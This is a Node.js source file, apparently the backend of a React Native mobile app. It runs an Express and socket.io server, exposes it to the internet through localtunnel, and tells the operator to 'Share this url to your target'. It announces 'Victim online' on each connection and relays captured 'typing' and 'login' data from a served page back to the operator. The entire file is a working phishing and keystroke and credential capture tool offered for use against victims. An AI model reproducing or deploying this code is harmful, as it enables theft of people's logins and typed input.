var rn_bridge = require('rn-bridge');
const localtunnel = require('localtunnel');
const express = require('express');
const app = express()
const http = require('http').createServer(app)
const io = require('socket.io')(http)
var tunnel;
const startServer=()=>{
const port = 8080;
/*starting server and tunneling */
rn_bridge.channel.send("Generating link please wait..");
setTimeout(()=>{},3000);
http.listen(port, (err) => {
    if (err) return;
   (async () => {
    tunnel = await localtunnel({ port: 8080 });
    rn_bridge.channel.send("URL"+tunnel.url);
    rn_bridge.channel.send("Share this url to your target");
    })();
});
app.use(express.static(__dirname + '/public'))
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html')
})
/*starting socket */
io.on('connection', (socket) => {
    rn_bridge.channel.send("Victim online");
    socket.on('typing', (data) => {
      //socket.broadcast.emit('message', msg)
      rn_bridge.channel.send(data);
      })
    socket.on('login', (data) => {
        //socket.broadcast.emit('message', msg)
        rn_bridge.channel.send(data);
      });})

}//startserver function close 

const stopServer =()=>{
  http.close();
  rn_bridge.channel.send("Server stopped")
}

rn_bridge.channel.on('message', (msg) => {
  try {
    switch(msg) {
      case 'start':
        startServer()
        break;
        case 'stop':
        stopServer()
        break;
      default:
        rn_bridge.channel.send(
          "unknown request:\n" +
          msg
        );
        break;
    }
  } catch (err)
  {
    rn_bridge.channel.send("Error: " + JSON.stringify(err) + " => " + err.stack );
  }
});